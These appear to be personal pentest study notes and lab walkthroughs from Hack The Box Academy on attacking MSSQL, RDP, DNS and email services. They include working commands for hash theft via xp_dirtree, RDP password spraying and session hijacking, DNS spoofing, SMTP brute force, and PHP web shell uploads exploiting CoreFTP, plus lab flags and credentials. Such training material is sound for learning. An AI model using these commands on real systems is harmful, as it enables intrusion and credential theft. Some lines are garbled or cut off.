-Next, we can attempt to identify the user used for the connection and its privileges. The EXECUTE statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets ([ ]).
1> EXECUTE('select @@sercd vername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO
-Note: If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).

<test>What is the password for the "mssqlsvc" user?
$sudo apt install sqlcmd
htbduser:MSSQLAccess01!:
$sqlcmd -S <ip> -U htbdbuser
-In another terminal tab on Pwnbox/PMVPN, students need to start an SMB share with impacket-smbserver and utilize the flag -smb2support:
$sudo impacket-smbserver share ./ -smb2support
Afterward, using the terminal tab with the sqlcmd connection, students need to steal the MSSQL service account hash using either xp_subdirs or xp_dirtree, the latter will be used:
EXEC master..xp_dirtree '\\pwnIp\share' >GO
Students will receive the NetNTLMv2 hash of mssqlsvc on the terminal tab with impacket-smbserver running:
$echo "mssqlsvc::WIN-02:aaaaaaaaaaaaaaaa:da87f7aa577b48e8361cf1b021e6bfca:010100000000000000555ef6718cd801e1b423320a45d0570000000001001000760055004a005100610058005200550003001000760055004a00510061005800520055000200100069004700430077004f0055006b0077000400100069004700430077004f0055006b0077000700080000555ef6718cd80106000400020000000800300030000000000000000000000000300000f4316f662256a822989f5d2574efb5b4cbf92c2ce43cb82538c6b2b358a130650a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0034000000000000000000" > hash.txt

Steal The Hash
Step	Stealing the Hash	Concept of Attacks - Category
5.	Here, the SMB service receives the information about the specified order through the previous process of the MSSQL service.	Source
6.	The data is then processed, and the specified folder is queried for the contents.	Process
7.	The associated authentication hash is used accordingly since the MSSQL running user queries the service.	Privileges
8.	In this case, the destination for the authentication and query is the host we control and the shared folder on the network.	Destination
-Finally, the hash is intercepted by tools like Responder, WireShark, or TCPDump and displayed to us, which we can try to use for our purposes. Apart from that, there are many different ways to execute commands in MSSQL. For example, another interesting method would be to execute Python code in a SQL query. We can find more about this in the documentation from Microsoft. However, this and other possibilities of what we can do with MSSQL will be discussed in another module.

\\\\=============================================
Attacking RDP 
-while RDP greatly facilitates remote administration of distributed IT systems, it also creates another gateway for attacks.
By default, RDP uses port TCP/3389. Using Nmap, we can identify the available RDP service on the target host:
$nmap -Pn -p3389 192.168.2.143
\\Misconfigurations
-Since RDP takes user credentials for authentication, one common attack vector against the RDP protocol is password guessing. Although it is not common, we could find an RDP service without a password if there is a misconfiguration
-One caveat on password guessing against Windows instances is that you should consider the client's password policy. In many cases, a user account will be locked or disabled after a certain number of failed login attempts. In this case, we can perform a specific password guessing technique called Password Spraying. This technique works by attempting a single password for many usernames before trying another password, being careful to avoid account lockout.
-Using the Crowbar tool, we can perform a password spraying attack against the RDP service. As an example below, the password password123 will be tested against a list of usernames in the usernames.txt file. The attack found the valid credentials as administrator : password123 on the target RDP host.
$cat username.txt 
root
test
user
guest
admin
administrator
\\Crowbar - RDP Password Spraying
$crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
\\Hydra - RDP Password Spraying
$hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
\\RDP Login 
$rdesktop -u admin -p password123 192.168.2.143
\\Protocol Specific Attacks
-If a user is connected via RDP to our compromised machine, we can hijack the user's remote desktop session to escalate our privileges and impersonate the account. In an Active Directory environment, this could result in us taking over a Domain Admin account or furthering our access within the domain.
\\RDP Session Hijacking
As shown in the example below, we are logged in as the user juurena (UserID = 2) who has Administrator privileges. Our goal is to hijack the user lewen (User ID = 4), who is also logged in via RDP.
-To impersonate a user without their password, elevate to SYSTEM and run Microsoft tscon.exe to attach to another desktop session. Specify the target SESSION ID (e.g., 4 for the lewen session) and the current session name (e.g., rdp-tcp#13). For example, the command below opens a console as that SESSION_ID inside our current RDP session:
tscon ${TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
-If we have local administrator privileges, we can use several methods to obtain SYSTEM privileges, such as PsExec or Mimikatz. A simple trick is to create a Windows service that, by default, will run as Local System and will execute any binary with SYSTEM privileges. We will use Microsoft sc.exe binary. First, we specify the service name (sessionhijack) and the binpath, which is the command we want to execute. Once we run the following command, a service named sessionhijack will be created.
$query user
$sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
-To run the command, we can start the sessionhijack service :
$net start sessionhijack
Once the service is started, a new terminal with the lewen user session will appear. With this new account, we can attempt to discover what kind of privileges it has on the network, and maybe we'll get lucky, and the user is a member of the Help Desk group with admin rights to many hosts or even a Domain Admin.
\\RDP Pass-the-Hash (PtH)
-If GUI-only apps on a Windows host are needed during a pentest but you only have an NT hash (not the plaintext password), you can sometimes use an RDP Pass-the-Hash technique (e.g., via xfreerdp) to obtain RDP access. Note this approach has limitations — for example, the target must have Restricted Admin Mode enabled (it's off by default), otherwise the connection will fail with an error.
-Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error:
$reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access:
$# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
-Keep in mind that this will not work against every Windows system we encounter, but it is always worth trying in a situation where we have an NTLM hash, know the user has RDP rights against a machine or set of machines, and GUI access would benefit us in some ways towards fulfilling the goal of our assessment.
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

\\Lastest RDP vul
In 2019, a critical vulnerability was published in the RDP (TCP/3389) service that also led to remote code execution (RCE) with the identifier CVE-2019-0708. This vulnerability is known as BlueKeep. It does not require prior access to the system to exploit the service for our purposes
-The vulnerability works similarly to SMB, relying on crafted requests sent to the target service. The critical risk is that it can be triggered without authentication. It occurs right after the connection is initialized, during basic client-server parameter exchange. This flaw is a Use-After-Free (UAF) issue, where freed memory is misused to run arbitrary code.
\\The Concept of Attacks
Step	BlueKeep	Concept of Attacks - Category
1.	Here, the source is the initialization request of the settings exchange between server and client that the attacker has manipulated.	Source
2.	The request leads to a function used to create a virtual channel containing the vulnerability.	Process
3.	Since this service is suitable for administering of the system, it is automatically run with the LocalSystem Account privileges of the system.	Privileges
4.	The manipulation of the function redirects us to a kernel process.	Destination
This is when the cycle starts all over again, but this time to gain remote access to the target system.

Trigger Remote Code Execution
Step	BlueKeep	Concept of Attacks - Category
5.	The source this time is the payload created by the attacker that is inserted into the process to free the memory in the kernel and place our instructions.	Source
6.	The process in the kernel is triggered to free the kernel memory and let the CPU point to our code.	Process
7.	Since the kernel also runs with the highest possible privileges, the instructions we put into the freed kernel memory here are also executed with LocalSystem Account privileges.	Privileges
8.	With the execution of our instructions from the kernel, a reverse shell is sent over the network to our host.	Destination
-Attack uses kernel-level steps (omitted). Once exploitation frees memory, attackers overwrite kernel memory, inject code into the freed region, and force the CPU to execute it. For a technical BlueKeep analysis, see the article mentioned.
- Note: This is a flaw that we will likely run into during our penetration tests, but it can cause system instability, including a "blue screen of death (BSoD)," and we should be careful before using the associated exploit. If in doubt, it's best to first speak with our client so they understand the risks and then decide if they would like us to run the exploit or not.

\\Attacking DNS
DNS maps domain names (e.g., hackthebox.com) to IP addresses (e.g., 104.17.42.72). It mainly uses UDP port 53 but falls back to TCP port 53 for large responses. Because nearly every app depends on DNS, DNS servers are a common high-impact attack target.
\\Enumeration
$nmap -p53 -Pn -sC 10.10.110.213

\\DNS Zone Transfer
DNS zones are portions of the DNS namespace managed by an administrator. Zone transfers (over TCP/53) copy zone data between servers; if not IP-restricted they require no authentication, so an attacker can run dig AXFR to dump a server’s zone and enumerate the organization’s namespace.

\\DIG - AXFR Zone Transfer

\\Domain Takeovers & Subdomain Enumeration
-Domain takeover is claiming an unregistered/expired domain to control it (e.g., host malware or send phishing).
Subdomain takeover occurs when a subdomain’s CNAME points to an external service (AWS, GitHub, CDN, etc.) that no longer hosts the resource — an attacker can claim that external resource and hijack the subdomain.
sub.target.com.   60   IN   CNAME   anotherdomain.com
-If sub.target.com is a CNAME to anotherdomain.com and anotherdomain.com expires, whoever registers anotherdomain.com controls sub.target.com until the CNAME is updated.

\\Subdomain Enumeration
-Before performing a subdomain takeover, we should enumerate subdomains for a target domain using tools like Subfinder. This tool can scrape subdomains from open sources like DNSdumpster. Other tools like Sublist3r can also be used to brute-force subdomains by supplying a pre-generated wordlist:
https://github.com/projectdiscovery/subfinder
https://dnsdumpster.com/
https://github.com/aboul3la/Sublist3r
$./subfinder -d inlanefrieght.com -v
An excellent alternative is a tool called Subbrute. This tool allows us to use self-defined resolvers and perform pure DNS brute-forcing attacks during internal penetration tests on hosts that do not have Internet access.
https://github.com/TheRook/subbrute

\\Subbrute
$ git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
 cd subbrute
  echo "ns1.inlanefreight.com" > ./resolvers.txt
  ./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt

-Poorly secured physical setups let attackers load tools from USB; after pivoting to an internal host an attacker can also operate from there. The tool found four subdomains for inlanefreight.com — use nslookup or host to enumerate their CNAME records.
[!bash!]# host support.inlanefreight.com
support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com
support.inlanefreight.com is a CNAME to an AWS S3 bucket; the site returns NoSuchBucket, so an attacker could register an S3 bucket named support.inlanefreight.com and hijack the subdomain.
-https://github.com/EdOverflow/can-i-take-over-xyz
The can-i-take-over-xyz repository is also an excellent reference for a subdomain takeover vulnerability. It shows whether the target services are vulnerable to a subdomain takeover and provides guidelines on assessing the vulnerability.

\\DNS Spoofing
ChatGPT said:

DNS spoofing (DNS cache poisoning) replaces legitimate DNS records with false ones to redirect users to malicious sites. Attackers achieve this either via a man-in-the-middle intercept between a user and a DNS resolver or by compromising a DNS server and altering its records.
-An attacker could intercept the communication between a user and a DNS server to route the user to a fraudulent destination instead of a legitimate one by performing a Man-in-the-Middle (MITM) attack.
-Exploiting a vulnerability found in a DNS server could yield control over the server by an attacker to modify the DNS records.

\\Local DNS Cache Poisoning
-From a local network perspective, an attacker can also perform DNS Cache Poisoning using MITM tools like Ettercap or Bettercap.
https://www.ettercap-project.org/
https://www.bettercap.org/
-To exploit the DNS cache poisoning via Ettercap, we should first edit the /etc/ettercap/etter.dns file to map the target domain name (e.g., inlanefreight.com) that they want to spoof and the attacker's IP address (e.g., 192.168.225.110) that they want to redirect a user to:
$cat /etc/ettercap/etter.dns
inlanefreight.com A 192.168.225.110
*.inlanefreight.com A 192.168.225.110

-Next, start the Ettercap tool and scan for live hosts within the network by navigating to Hosts > Scan for Hosts. Once completed, add the target IP address (e.g., 192.168.152.129) to Target1 and add a default gateway IP (e.g., 192.168.152.2) to Target2
-Activate dns_spoof attack by navigating to Plugins > Manage Plugins. This sends the target machine with fake DNS responses that will resolve inlanefreight.com to IP address 192.168.225.110:
-After a successful DNS spoof attack, if a victim user coming from the target machine 192.168.152.129 visits the inlanefreight.com domain on a web browser, they will be redirected to a Fake page that is hosted on IP address 192.168.225.110:
In addition, a ping coming from the target IP address 192.168.152.129 to inlanefreight.com should be resolved to 192.168.225.110 as well:

\\Lastest DNS Vulnerabilities
The Concept of the Attack
-If a CNAME in the company DNS points to a subdomain that no longer exists (returns HTTP 404), we can register that missing target with the third-party provider and take over the subdomain. Once we claim the nonexistent domain and make one DNS change, the subdomain resolves to our registration and we control it.

\\The Concept of Attacks
-Initiation of Subdomain Takeover
Step	Subdomain Takeover	Concept of Attacks - Category
1.	The source, in this case, is the subdomain name that is no longer used by the company that we discovered.	Source
2.	The registration of this subdomain on the third-party provider's site is done by registering and linking to own sources.	Process
3.	Here, the privileges lie with the primary domain owner and its entries in its DNS servers. In most cases, the third-party provider is not responsible for whether this subdomain is accessible via others.	Privileges
4.	The successful registration and linking are done on our server, which is the destination in this case.	Destination
This is when the cycle starts all over again, but this time to trigger the forwarding to the server we control.

Trigger the Forwarding
Step	Subdomain Takeover	Concept of Attacks - Category
5.	The visitor of the subdomain enters the URL in his browser, and the outdated DNS record (CNAME) that has not been removed is used as the source.	Source
6.	The DNS server looks in its list to see if it has knowledge about this subdomain and if so, the user is redirected to the corresponding subdomain (which is controlled by us).	Process
7.	The privileges for this already lie with the administrators who manage the domain, as only they are authorized to change the domain and its DNS servers. Since this subdomain is in the list, the DNS server considers the subdomain as trustworthy and forwards the visitor.	Privileges
8.	The destination here is the person who requests the IP address of the subdomain where they want to be forwarded via the network.	Destination
-Subdomain takeover can be used not only for phishing but also for many other attacks. These include, for example, stealing cookies, cross-site request forgery (CSRF), abusing CORS, and defeating content security policy (CSP). We can see some examples of subdomain takeovers on the HackerOne website, which have earned the bug bounty hunters considerable payouts.

\\\\\\\\\\========================================
Attacking Email service
-A mail server handles sending, receiving and storing email over a network. Clients (computers, phones) send mail to an SMTP (Simple Mail Transfer Protocol) server when the user hits Send; SMTP also transfers mail between servers. To download mail, clients connect to POP3 or IMAP4 servers: POP3 typically removes messages from the server after download (though it can be configured to keep copies), making multi-device access harder; IMAP4 leaves messages on the server by default, enabling easy multi-device access. Next: how attackers can target mail servers.
\\Enumeration
-Email infrastructure is complex — multiple servers, ports and services — and many organizations host email in cloud providers like Microsoft 365 or Google Workspace, so the attack method depends on the service. Use the domain's MX (Mail eXchanger) DNS records to find the mail servers (there can be multiple for redundancy/load-balancing). Query MX records with tools like dig/host or online services such as MXToolbox.
-We can use the Mail eXchanger (MX) DNS record to identify a mail server. The MX record specifies the mail server responsible for accepting email messages on behalf of a domain name. It is possible to configure several MX records, typically pointing to an array of mail servers for load balancing and redundancy.

\\Host - MX records
$host -t MX hackthebox.eu 
$host -t MX microsoft.com

\\DIG - MX Records 
$dig mx plaintext.do | grep "MX" | grep -v ";"
$dig mx inlanefreight.com | grep "MX" | grep -v ";"

\\HOST - A Records 
$host -t A mail1.inlanefreight.htb
-The MX records show three cloud providers — Google (aspmx.l.google.com), Microsoft 365 (microsoft-com.mail.protection.outlook.com) and Zoho (mx.zoho.com) — plus a possible company-hosted mail server. That matters because enumeration and attacks differ by provider: cloud services use provider-specific implementations and modern auth (introducing unique attack vectors), while self-hosted servers can expose misconfigurations and classic protocol weaknesses. If targeting a custom mail server (e.g. inlanefreight.htb) enumerate common mail/webmail ports such as:
SMTP/submission: 25, 587, 465
IMAP/IMAPS: 143, 993
POP3/POP3S: 110, 995
Webmail/OWA/API/ActiveSync: 80, 443
Mail filtering/management (optional): 4190 (ManageSieve) and other service ports.
Port	Service
TCP/25	SMTP Unencrypted
TCP/143	IMAP4 Unencrypted
TCP/110	POP3 Unencrypted
TCP/465	SMTP Encrypted
TCP/587	SMTP Encrypted/STARTTLS
TCP/993	IMAP4 Encrypted
TCP/995	POP3 Encrypted
-We can use Nmap's default script -sC option to enumerate those ports on the target system:
$sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128

\\Misconfiguration
Email services use authentication to allow users to send emails and receive emails. A misconfiguration can happen when the SMTP service allows anonymous authentication or support protocols that can be used to enumerate valid usernames.

\\Authentication
VRFY asks an SMTP server whether a specific username exists; the server replies if the user is valid or not. If enumeration succeeds (via VRFY, EXPN, RCPT TO, etc.), attackers can perform password spraying, brute force, or guessing — note that VRFY may be disabled.

\\VRFY Command
$telnet 10.10.110.20 25
VRFY root 
VRFY www-data
VRFY new-user
EXPN is similar to VRFY, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the VRFY command since sites often have an alias such as "all."

\\EXPN Command
$telnet 10.10.110.20 25
EXPN john
EXPN support-team 
-RCPT TO identifies the recipient of the email message. this command can be repeated multiple times for a given message to deliver a single message to multiple recipient

\\RCPT TO command
$telnet 10.10.110.20 25
MAIL FROM:test@htb.com
RCPT TO:julio 
RCPT TO:kate
RCPT TO:john
e can also use the POP3 protocol to enumerate users depending on the service implementation. For example, we can use the command USER followed by the username, and if the server responds OK. This means that the user exists on the server.

\\USER Command
$telnet 10.10.110.20 110
USER julio
USER john
-Use smtp-user-enum to automate username enumeration.
Flags: -M (mode: VRFY/EXPN/RCPT), -U (file with usernames), -D (domain, if required), and -t (target SMTP host).
Depending on server and mode, discovered valid users enable password-spray, brute-force or guessing attempts.

$smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

\\Cloud Enumeration
Cloud providers add proprietary features that can be abused for username enumeration — Office 365 is a good example. O365spray (by ZDH) is a username-enumeration and password-spray tool for Microsoft 365 that implements several researched techniques. First step: verify whether the target domain is using Office 365.

\\O365 Spray
$python3 o365spray.py --validate --domain msplaintext.xyz
identify usernames
$python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz

\\Password Attack
We can use Hydra to perform a password spray or brute force against email services such as SMTP, POP3, or IMAP4. First, we need to get a username list and a password list and specify which service we want to attack. Let us see an example for POP3.

\\Hydra - Password Attack
$hydra -L users.txt -p 'Company01!' -f 10.10.110.20 POP3
-If cloud providers expose SMTP/POP3/IMAP4, password-spraying with tools like Hydra may work but is often blocked. Use provider-specific tools instead — e.g. o365spray or MailSniper for Microsoft 365, CredKing for Gmail/Okta. Keep tools up-to-date and understand their internals so you can modify them when providers change their services.
\\o365 spray - password spraying
$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

\\Protocol Specifies Attacks
An open relay is a Simple Mail Transfer Protocol (SMTP) server, which is improperly configured and allows an unauthenticated email relay. Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.
\\Open relay
$nmap -p25 -Pn --script smtp-open-replay 10.10.11.213
-Next, we can use any mail client to connect to the mail server and send our email.

lastest Email Service vul
One of the most recent publicly disclosed and dangerous Simple Mail Transfer Protocol (SMTP) vulnerabilities was discovered in OpenSMTPD up to version 6.6.2 service was in 2020. This vulnerability was assigned CVE-2020-7247 and leads to RCE
\\The Concept of the Attack
SMTP’s sender-address handler is vulnerable to command injection: inserting a semicolon lets an attacker escape into the shell and run up to 64 characters of arbitrary commands — technical details here.

The Concept of Attacks
Step	Remote Code Execution	Concept of Attacks - Category
1.	The source is the user input that can be entered manually or automated during direct interaction with the service.	Source
2.	The service will take the email with the required information.	Process
3.	Listening to the standardized ports of a system requires root privileges on the system, and if these ports are used, the service runs accordingly with elevated privileges.	Privileges
4.	As the destination, the entered information is forwarded to another local process.	Destination
This is when the cycle starts all over again, but this time to gain remote access to the target system.

Step	Remote Code Execution	Concept of Attacks - Category
5.	This time, the source is the entire input, especially from the sender area, which contains our system command.	Source
6.	The process reads all the information, and the semicolon (;) interrupts the reading due to special rules in the source code that leads to the execution of the entered system command.	Process
7.	Since the service is already running with elevated privileges, other processes of OpenSMTPD will be executed with the same privileges. With these, the system command we entered will also be executed.	Privileges
8.	The destination for the system command can be, for example, the network back to our host through which we get access to the system.	Destination

<test> You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer.
$ nmap -A 10.129.203.7
https://academy.hackthebox.com/storage/resources/users.zip
$ wget https://academy.hackthebox.com/storage/resources/users.zip && unzip users.zip
-Subsequently, students need to use smtp-user-enum, setting the method to use for username guessing to be RCPT, the file of usernames to be checked to be users.list, and the domain to be inlanefreight.htb, finding the username fiona:
$ /usr/bin/smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.7
-Then, students need to bruteforce the FTP password of the user fiona using either Hydra or medusa; Hydra will be used, most importantly, the number of threads is set to 1, otherwise students will get a 550 error:
$ hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://10.129.203.7 -u -t 1
-With the found credentials fiona:987654321, students need to connect to the FTP server on the spawned target, providing fiona as the username and 987654321 as the password
$ ftp 10.129.203.7
When using dir to list the files available, students will find docs.txt and WebServersInfo.txt, thus, they need to get them:
get docs.txt
get WebServersInfo.txt
bye
ftp> get docs.txt
ftp> get WebServersInfo.txt
When checking out the contents of WebServersInfo.txt, students will notice that the spawned target uses CoreFTP, and that the Apache directory is at C:\xampp\htdocs\:
$ awk 1 WebServersInfo.txt
Armed with this info, students need to search for CoreFTP exploits using searchsploit:
$ searchsploit CoreFTP
Since students have the credentials fiona:987654321, they need to mirror/copy the windows/remote/50652.txt exploit:
searchsploit -x windows/remote/50652.txt
After reading the text file, students will know that they can create files with PUT requests:
cat 50652.txt
-Therefore, students need to write a PHP file that contains a web shell (students can generate a random name with the command openssl rand -hex 16) within the --data-binary option, utilizing the Apache directory /xampp/htdocs (since other directories might not be allowed):
$ curl -k -X PUT -H "Host: 10.129.242.84" --basic -u fiona:987654321 --data-binary '<?php echo shell_exec($_GET["c"]);?>' --path-as-is https://10.129.242.84/../../../../../../xampp/htdocs/1af271ec0935f7ccbd31dc24666f7f33.php
-At last, students need to print out the contents of the flag file "flag.txt", which is inside the directory C:\Users\Administrator\Desktop\, using the web shell (utilizing HTTP and not HTTPS):
curl -w "\n" http://STMIP/1af271ec0935f7ccbd31dc24666f7f33.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt
HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
<alternative>
$ mysql -u fiona -p987654321 -h 10.129.242.84
Subsequently, to check whether files can be read and written, students need to query for the value of the global variable secure_file_priv, finding it to be empty, therefore, files can be read and written:
$show variables like "secure_file_priv";
Students need to write a PHP file that contains a web shell (students can generate a random name with the command openssh rand -hex 16) with the statement SELECT ... INTO OUTFILE, utilizing the Apache directory /xampp/htdocs:
$SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:/xampp/htdocs/90957b76a1f20de2b13c5bcb2d05b5cf.php';
Then, students need to print out the contents of the flag file "flag.txt", which is inside the directory C:\Users\Administrator\Desktop\, using the web shell (utilizing HTTP and not HTTPS):
curl -w "\n" http://STMIP/90957b76a1f20de2b13c5bcb2d05b5cf.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt

<MTest>Assess the target server and find the the flag.txt file. Submit the contents of this file as your answer."
$ nmap -A 10.129.183.208

 add the vHost int-ftp.inlanefreight.htb (this can be easily known as the section says "From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.") into /etc/hosts:
 sudo sh -c 'echo "STMIP int-ftp.inlanefreight.htb" >> /etc/hosts'
Launching an Nmap scan agains int-ftp.inlanefreight.htb, students will find that port 30021 runs ProFTPD:
$ nmap -p- -T4 -A int-ftp.inlanefreight.htb
When attempting to use anonymous FTP login (i.e., anonymous for username and anything for password) on port 30021, students will notice that they can login successfull

With the attained credentials, students need to connect to port 110 and use simon for user and 8Ns8j1b!23hs4921smHzwn for password to log in:
$nc -nv STMIP 110
$user simon
